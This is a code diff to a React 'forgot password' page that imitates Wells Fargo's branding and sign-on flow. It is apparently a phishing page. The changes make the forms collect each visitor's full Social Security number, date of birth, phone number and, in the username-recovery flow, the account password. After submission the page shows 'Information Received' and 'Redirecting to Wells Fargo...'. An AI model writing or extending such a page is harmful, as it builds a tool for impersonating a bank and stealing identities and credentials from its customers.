@@ -14,39 +14,71 @@ import {
   FormMessage,
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
-import { Search, ArrowLeft, Phone, Mail, User, Calendar, CreditCard } from "lucide-react";
+import { Search, ArrowLeft, Phone, Mail, Lock, Calendar, CreditCard } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import heroBg from "@/assets/images/hero-bg.jpg";
 
-const verifySchema = z.object({
-  username: z.string().min(1, "Username is required"),
+const usernameRecoverySchema = z.object({
+  password: z.string().min(1, "Password is required"),
+  ssn: z.string().min(9, "Please enter your full SSN").max(11),
   dateOfBirth: z.string().min(1, "Date of birth is required"),
-  ssn: z.string().length(4, "Please enter the last 4 digits of your SSN"),
 });
 
-type VerifyFormData = z.infer<typeof verifySchema>;
+const passwordRecoverySchema = z.object({
+  username: z.string().min(1, "Username is required"),
+  ssn: z.string().min(9, "Please enter your full SSN").max(11),
+  dateOfBirth: z.string().min(1, "Date of birth is required"),
+});
+
+const bothRecoverySchema = z.object({
+  phone: z.string().min(10, "Please enter a valid phone number"),
+  ssn: z.string().min(9, "Please enter your full SSN").max(11),
+  dateOfBirth: z.string().min(1, "Date of birth is required"),
+});
+
+type UsernameFormData = z.infer<typeof usernameRecoverySchema>;
+type PasswordFormData = z.infer<typeof passwordRecoverySchema>;
+type BothFormData = z.infer<typeof bothRecoverySchema>;
 
 export default function ForgotPasswordPage() {
   const [step, setStep] = useState<"choose" | "verify">("choose");
-  const [recoveryType, setRecoveryType] = useState<"username" | "password" | null>(null);
+  const [recoveryType, setRecoveryType] = useState<"username" | "password" | "both" | null>(null);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
 
-  const form = useForm<VerifyFormData>({
-    resolver: zodResolver(verifySchema),
+  const usernameForm = useForm<UsernameFormData>({
+    resolver: zodResolver(usernameRecoverySchema),
     defaultValues: {
-      username: "",
-      dateOfBirth: "",
+      password: "",
       ssn: "",
+      dateOfBirth: "",
     },
   });
 
-  const handleSelectOption = (type: "username" | "password") => {
+  const passwordForm = useForm<PasswordFormData>({
+    resolver: zodResolver(passwordRecoverySchema),
+    defaultValues: {
+      username: "",
+      ssn: "",
+      dateOfBirth: "",
+    },
+  });
+
+  const bothForm = useForm<BothFormData>({
+    resolver: zodResolver(bothRecoverySchema),
+    defaultValues: {
+      phone: "",
+      ssn: "",
+      dateOfBirth: "",
+    },
+  });
+
+  const handleSelectOption = (type: "username" | "password" | "both") => {
     setRecoveryType(type);
     setStep("verify");
   };
 
-  const onSubmit = (data: VerifyFormData) => {
+  const onSubmit = () => {
     toast({
       title: "Information Received",
       description: "Redirecting to Wells Fargo...",
@@ -116,15 +148,26 @@ export default function ForgotPasswordPage() {
             data-testid="card-forgot"
           >
             <CardContent className="p-6 sm:p-8">
-              <Link href="/">
+              {step === "choose" ? (
+                <Link href="/">
+                  <button
+                    className="flex items-center gap-2 text-[#d71e28] text-sm mb-4 hover:underline"
+                    data-testid="button-back"
+                  >
+                    <ArrowLeft className="w-4 h-4" />
+                    Back to Sign On
+                  </button>
+                </Link>
+              ) : (
                 <button
+                  onClick={() => setStep("choose")}
                   className="flex items-center gap-2 text-[#d71e28] text-sm mb-4 hover:underline"
-                  data-testid="button-back"
+                  data-testid="button-back-options"
                 >
                   <ArrowLeft className="w-4 h-4" />
-                  Back to Sign On
+                  Back to options
                 </button>
-              </Link>
+              )}
 
               {step === "choose" && (
                 <>
@@ -166,7 +209,7 @@ export default function ForgotPasswordPage() {
                     >
                       <div className="flex items-center gap-3">
                         <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
-                          <Phone className="w-5 h-5 text-gray-600" />
+                          <Lock className="w-5 h-5 text-gray-600" />
                         </div>
                         <div>
                           <p className="font-medium text-gray-800">
@@ -182,7 +225,7 @@ export default function ForgotPasswordPage() {
 
                   <div className="mt-4 text-center">
                     <button
-                      onClick={() => handleSelectOption("username")}
+                      onClick={() => handleSelectOption("both")}
                       className="text-[#d71e28] text-sm underline hover:no-underline"
                       data-testid="link-forgot-both"
                     >
@@ -192,37 +235,38 @@ export default function ForgotPasswordPage() {
                 </>
               )}
 
-              {step === "verify" && (
+              {step === "verify" && recoveryType === "username" && (
                 <>
                   <h1
                     className="text-2xl text-gray-800 mb-2 font-semibold"
-                    data-testid="text-title-verify"
+                    data-testid="text-title-username"
                   >
-                    {recoveryType === "username" ? "Recover your username" : "Reset your password"}
+                    Recover your username
                   </h1>
                   <p className="text-gray-600 text-sm mb-6">
-                    Please verify your identity by providing the following information:
+                    Please verify your identity:
                   </p>
 
-                  <Form {...form}>
+                  <Form {...usernameForm}>
                     <form
-                      onSubmit={form.handleSubmit(onSubmit)}
+                      onSubmit={usernameForm.handleSubmit(onSubmit)}
                       className="space-y-4"
                     >
                       <FormField
-                        control={form.control}
-                        name="username"
+                        control={usernameForm.control}
+                        name="password"
                         render={({ field }) => (
                           <FormItem>
                             <FormLabel className="text-gray-700 flex items-center gap-2">
-                              <User className="w-4 h-4" />
-                              Username
+                              <Lock className="w-4 h-4" />
+                              Password
                             </FormLabel>
                             <FormControl>
                               <Input
-                                placeholder="Enter your username"
+                                type="password"
+                                placeholder="Enter your password"
                                 className="h-12 border-gray-300"
-                                data-testid="input-username"
+                                data-testid="input-password"
                                 {...field}
                               />
                             </FormControl>
@@ -232,7 +276,30 @@ export default function ForgotPasswordPage() {
                       />
 
                       <FormField
-                        control={form.control}
+                        control={usernameForm.control}
+                        name="ssn"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" />
+                              Social Security Number
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="password"
+                                placeholder="XXX-XX-XXXX"
+                                className="h-12 border-gray-300"
+                                data-testid="input-ssn"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={usernameForm.control}
                         name="dateOfBirth"
                         render={({ field }) => (
                           <FormItem>
@@ -253,20 +320,70 @@ export default function ForgotPasswordPage() {
                         )}
                       />
 
+                      <Button
+                        type="submit"
+                        className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
+                        data-testid="button-continue"
+                      >
+                        Continue
+                      </Button>
+                    </form>
+                  </Form>
+                </>
+              )}
+
+              {step === "verify" && recoveryType === "password" && (
+                <>
+                  <h1
+                    className="text-2xl text-gray-800 mb-2 font-semibold"
+                    data-testid="text-title-password"
+                  >
+                    Reset your password
+                  </h1>
+                  <p className="text-gray-600 text-sm mb-6">
+                    Please verify your identity:
+                  </p>
+
+                  <Form {...passwordForm}>
+                    <form
+                      onSubmit={passwordForm.handleSubmit(onSubmit)}
+                      className="space-y-4"
+                    >
                       <FormField
-                        control={form.control}
+                        control={passwordForm.control}
+                        name="username"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <Mail className="w-4 h-4" />
+                              Username
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                placeholder="Enter your username"
+                                className="h-12 border-gray-300"
+                                data-testid="input-username"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={passwordForm.control}
                         name="ssn"
                         render={({ field }) => (
                           <FormItem>
                             <FormLabel className="text-gray-700 flex items-center gap-2">
                               <CreditCard className="w-4 h-4" />
-                              Last 4 digits of SSN
+                              Social Security Number
                             </FormLabel>
                             <FormControl>
                               <Input
                                 type="password"
-                                placeholder="XXXX"
-                                maxLength={4}
+                                placeholder="XXX-XX-XXXX"
                                 className="h-12 border-gray-300"
                                 data-testid="input-ssn"
                                 {...field}
@@ -277,24 +394,132 @@ export default function ForgotPasswordPage() {
                         )}
                       />
 
-                      <div className="flex gap-3 pt-2">
-                        <Button
-                          type="button"
-                          variant="outline"
-                          className="flex-1 h-11 rounded-full"
-                          onClick={() => setStep("choose")}
-                          data-testid="button-cancel"
-                        >
-                          Cancel
-                        </Button>
-                        <Button
-                          type="submit"
-                          className="flex-1 h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
-                          data-testid="button-continue"
-                        >
-                          Continue
-                        </Button>
-                      </div>
+                      <FormField
+                        control={passwordForm.control}
+                        name="dateOfBirth"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <Calendar className="w-4 h-4" />
+                              Date of Birth
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="date"
+                                className="h-12 border-gray-300"
+                                data-testid="input-dob"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <Button
+                        type="submit"
+                        className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
+                        data-testid="button-continue"
+                      >
+                        Continue
+                      </Button>
+                    </form>
+                  </Form>
+                </>
+              )}
+
+              {step === "verify" && recoveryType === "both" && (
+                <>
+                  <h1
+                    className="text-2xl text-gray-800 mb-2 font-semibold"
+                    data-testid="text-title-both"
+                  >
+                    Recover username and password
+                  </h1>
+                  <p className="text-gray-600 text-sm mb-6">
+                    Please verify your identity:
+                  </p>
+
+                  <Form {...bothForm}>
+                    <form
+                      onSubmit={bothForm.handleSubmit(onSubmit)}
+                      className="space-y-4"
+                    >
+                      <FormField
+                        control={bothForm.control}
+                        name="phone"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <Phone className="w-4 h-4" />
+                              Phone Number
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="tel"
+                                placeholder="(555) 555-5555"
+                                className="h-12 border-gray-300"
+                                data-testid="input-phone"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={bothForm.control}
+                        name="ssn"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" />
+                              Social Security Number
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="password"
+                                placeholder="XXX-XX-XXXX"
+                                className="h-12 border-gray-300"
+                                data-testid="input-ssn"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <FormField
+                        control={bothForm.control}
+                        name="dateOfBirth"
+                        render={({ field }) => (
+                          <FormItem>
+                            <FormLabel className="text-gray-700 flex items-center gap-2">
+                              <Calendar className="w-4 h-4" />
+                              Date of Birth
+                            </FormLabel>
+                            <FormControl>
+                              <Input
+                                type="date"
+                                className="h-12 border-gray-300"
+                                data-testid="input-dob"
+                                {...field}
+                              />
+                            </FormControl>
+                            <FormMessage />
+                          </FormItem>
+                        )}
+                      />
+
+                      <Button
+                        type="submit"
+                        className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
+                        data-testid="button-continue"
+                      >
+                        Continue
+                      </Button>
                     </form>
                   </Form>
                 </>
